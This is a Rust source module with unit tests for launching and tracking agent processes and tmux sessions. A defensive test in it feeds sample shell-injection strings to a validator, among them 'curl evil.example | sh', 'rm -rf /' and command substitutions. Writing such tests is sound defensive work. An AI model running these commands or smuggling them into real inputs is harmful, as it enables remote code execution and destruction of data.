//! Shared machinery for launching and tracking child processes: agents, coders, terminal sessions.
//!
//! Extracted from `control.rs` (`gw-monolith-decompose`) ahead of the session routes, so those
//! depend on this rather than on the file they came from — the ordering that has kept every module
//! in this refactor pointing downward.
//!
//! **A naming trap this module does NOT contain.** "Session" means two different things in the
//! control API: a tmux TERMINAL session (launched, attachable, alive while its tmux session is) and
//! an auth LOGIN session (a cookie in `ucc-auth-sessions.json`). `sess_path` is the second one and
//! stayed with the auth code; grouping by the word would have merged two unrelated subjects.

use std::path::PathBuf;
use std::process::{Command, Stdio};

use crate::gateway_control::ensure_gateway;
use crate::paths::state_dir;

/// A `starting…` row whose in-process launch task died (control-serve restart / redeploy mid-launch)
/// is never transitioned by anything, so the row would show `starting…` forever. Prune such rows
/// once they're older than this. Also bounds a genuinely stuck cold-start.
pub(crate) const STARTING_TTL_SECS: u64 = 900;

/// Serializes every read-modify-write of the ucc-{sessions,agents,coders}.json registries. The
/// launch/stop routes and the status-poll prune paths all load→mutate→save the same small JSON
/// files; without this a poll's save can clobber a concurrent launch (lost update → orphan process
/// / row stuck at "starting…"). Held only around fast in-memory + file ops, so contention is nil.
pub(crate) fn registry_lock() -> std::sync::MutexGuard<'static, ()> {
    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    LOCK.lock().unwrap_or_else(|e| e.into_inner())
}

/// Monotonic per-process suffix so two launches of the same agent/room/model within one wall-clock
/// second get distinct ids (and distinct tmux names). `now_unix()` alone is second-granularity —
/// two `/session/launch` in the same second would collide on the tmux session name.
pub(crate) fn next_launch_seq() -> u64 {
    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

pub(crate) fn sanitize(s: &str) -> String {
    s.chars().map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' }).collect()
}

/// True if `s` cannot contain shell metacharacters — unlike `sanitize` (which mangles a string into a
/// safe one), this REJECTS instead of mutating, for values that get interpolated into a shell-command
/// string rather than passed as a plain argv element (`session_launch_route`'s tmux `inner` string).
/// Permits the charset real model/agent identifiers use (HF-style `org/repo:tag`, dots, plus signs).
pub(crate) fn shell_safe(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ':' | '@' | '+'))
}

pub(crate) fn tmux_name(id: &str) -> String { format!("rozum-{id}") }

/// Does the tmux session exist? (`tmux has-session` exit 0). The liveness source of truth.
pub(crate) fn tmux_alive(id: &str) -> bool {
    Command::new("tmux").args(["has-session", "-t", &tmux_name(id)])
        .stdout(Stdio::null()).stderr(Stdio::null())
        .status().map(|s| s.success()).unwrap_or(false)
}

pub(crate) fn is_executable_file(p: &std::path::Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(p)
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

/// Is `agent` actually runnable — an executable of that name on THIS process's PATH? The UCC offers
/// a fixed set of agent chips, but which of them are installed is a property of the machine, and
/// launchd's PATH is not the operator's shell PATH. Without this check a missing CLI is discovered
/// deep inside the spawned `rozum launch`, which exits 127 into a log file — so the row reports
/// "exited", which is indistinguishable from a run that finished.
pub(crate) fn agent_on_path(agent: &str) -> bool {
    let p = std::path::Path::new(agent);
    if p.components().count() > 1 {
        return is_executable_file(p);
    }
    let Some(path) = std::env::var_os("PATH") else { return false };
    std::env::split_paths(&path).any(|dir| is_executable_file(&dir.join(agent)))
}

/// The refusal for an agent the machine cannot run, naming the fix rather than the symptom.
/// `None` when the agent is installed.
pub(crate) fn agent_missing_reason(agent: &str) -> Option<String> {
    if agent_on_path(agent) {
        return None;
    }
    let how = match agent {
        "nadia" => "build + install it: `cargo install --path crates/nadia`",
        _ => "install its CLI and make sure it is on the service's PATH",
    };
    Some(format!("agent `{agent}` is not on PATH — {how}"))
}

/// Is `pid` still alive? `kill(pid, 0)` returns 0 for a live process we can signal.
/// pid 0 is the "not spawned yet" placeholder on starting records — never alive (and never
/// passed to kill: `kill(0, sig)` would signal our own whole process group).
pub(crate) fn pid_alive(pid: u32) -> bool {
    pid != 0 && unsafe { libc::kill(pid as libc::pid_t, 0) == 0 }
}

/// Derive the roster handle the participant uses, mirroring `model_participant::derive_handle` (the
/// short family name after the last `:` / `/`, before the first `-`), so the UI can @mention it.
pub(crate) fn derive_handle(model: &str) -> String {
    let tail = model.rsplit(['/', ':']).next().unwrap_or(model);
    let base = tail.split('-').next().unwrap_or(tail);
    base.to_lowercase()
}

/// Spawn `rozum meetings participant …` DETACHED (own process group, output → a per-agent log), so it
/// survives a control-serve restart. Returns the child pid.
pub(crate) fn spawn_participant(model: &str, room: &str, policy: &str, persona: &str, gw_port: u16) -> std::io::Result<u32> {
    use std::os::unix::process::CommandExt;
    let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("rozum"));
    let gw_url = format!("http://127.0.0.1:{gw_port}/v1");
    let log_path = state_dir()
        .map(|d| d.join("logs"))
        .unwrap_or_else(|| PathBuf::from("/tmp"));
    let _ = std::fs::create_dir_all(&log_path);
    let log = std::fs::OpenOptions::new()
        .create(true).append(true)
        .open(log_path.join(format!("agent-{}-{}.log", sanitize(room), sanitize(model))))?;
    let log2 = log.try_clone()?;
    let mut cmd = Command::new(&exe);
    cmd.args(["meetings", "participant", "--model", model, "--room", room, "--reply-policy", policy]);
    if !persona.is_empty() {
        cmd.args(["--persona", persona]);
    }
    cmd.args(["--gateway-url", &gw_url]);
    cmd.stdin(Stdio::null()).stdout(Stdio::from(log)).stderr(Stdio::from(log2));
    cmd.process_group(0); // detach from control-serve's group so it survives a service restart
    Ok(cmd.spawn()?.id())
}

/// The async-launch skeleton shared by the session/agent/coder launch routes. The route validates,
/// records the job as "starting…" and returns instantly; this runs the slow half in the background:
/// load the model via the shared gateway, re-check the record wasn't closed while it loaded, then
/// run the job-specific spawn (which owns its success status). A gateway failure lands in the
/// record's status as "failed: …" (truncated — statuses are phone-visible table cells).
pub(crate) fn spawn_launch_task<Fut>(
    model: String,
    task_id: String,
    still_wanted: impl Fn(&str) -> bool + Send + 'static,
    set_failed: impl Fn(&str, String) + Send + 'static,
    do_spawn: impl FnOnce(String, u16) -> Fut + Send + 'static,
) where
    Fut: std::future::Future<Output = ()> + Send + 'static,
{
    tokio::spawn(async move {
        let port = match ensure_gateway(&model).await {
            Ok(p) => p,
            Err(e) => {
                let msg: String = e.chars().take(120).collect();
                set_failed(&task_id, format!("failed: {msg}"));
                return;
            }
        };
        if !still_wanted(&task_id) {
            return;
        }
        do_spawn(task_id, port).await;
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_safe_accepts_realistic_model_and_agent_names() {
        assert!(shell_safe("claude"));
        assert!(shell_safe("codex"));
        assert!(shell_safe("mlx-community/Qwen2.5-Coder-7B-Instruct-4bit"));
        assert!(shell_safe("org/repo:tag+build"));
    }

    #[test]
    fn shell_safe_rejects_shell_metacharacters() {
        // These are exactly the shapes that would break out of the tmux `new-session` shell-command
        // string built in `session_launch_route` (see ucc-session-launch-injection).
        assert!(!shell_safe("codex; curl evil.example | sh"));
        assert!(!shell_safe("codex `id`"));
        assert!(!shell_safe("codex $(id)"));
        assert!(!shell_safe("codex && rm -rf /"));
        assert!(!shell_safe("codex\nrm -rf /"));
        assert!(!shell_safe("has space"));
        assert!(!shell_safe(""));
    }

    #[test]
    fn next_launch_seq_is_monotonic_and_unique() {
        // Two launches within one wall-clock second must get distinct ids; the seq is the tiebreaker.
        let a = next_launch_seq();
        let b = next_launch_seq();
        let c = next_launch_seq();
        assert!(a < b && b < c, "seq not strictly increasing: {a} {b} {c}");
    }

    #[test]
    fn agent_record_starting_ttl_is_pruned_but_fresh_kept() {
        // The prune predicate: a starting row past STARTING_TTL_SECS is dropped (dead launch task);
        // a fresh one is kept. This mirrors the partition condition in live_agents/live_sessions.
        let now = 1_000_000u64;
        let fresh_ok = |started: u64, status: &str| {
            status.starts_with("starting")
                && now.saturating_sub(started) < STARTING_TTL_SECS
        };
        assert!(fresh_ok(now - 10, "starting…"), "fresh starting must be kept");
        assert!(!fresh_ok(now - STARTING_TTL_SECS - 1, "starting…"), "stale starting must be pruned");
        assert!(!fresh_ok(now - 10, "running"), "non-starting handled by other branches");
    }

    #[test]
    fn missing_agent_is_refused_by_name_with_the_fix() {
        // `sh` is on every PATH this can run on; the refusal must name the agent AND how to get it.
        assert!(agent_on_path("sh"));
        assert!(agent_missing_reason("sh").is_none());
        assert!(!agent_on_path("rozum-no-such-agent-xyz"));
        let why = agent_missing_reason("nadia-not-installed-xyz").expect("must refuse");
        assert!(why.contains("nadia-not-installed-xyz") && why.contains("PATH"), "got: {why}");
        assert!(agent_missing_reason("nadia").is_none() || agent_missing_reason("nadia").unwrap().contains("cargo install"));
        // A path (not a bare name) is checked as given, not searched for on PATH.
        assert!(agent_on_path("/bin/sh"));
        assert!(!agent_on_path("/bin/definitely-not-here-xyz"));
        // A directory is not a runnable agent.
        assert!(!agent_on_path("/bin"));
    }
}
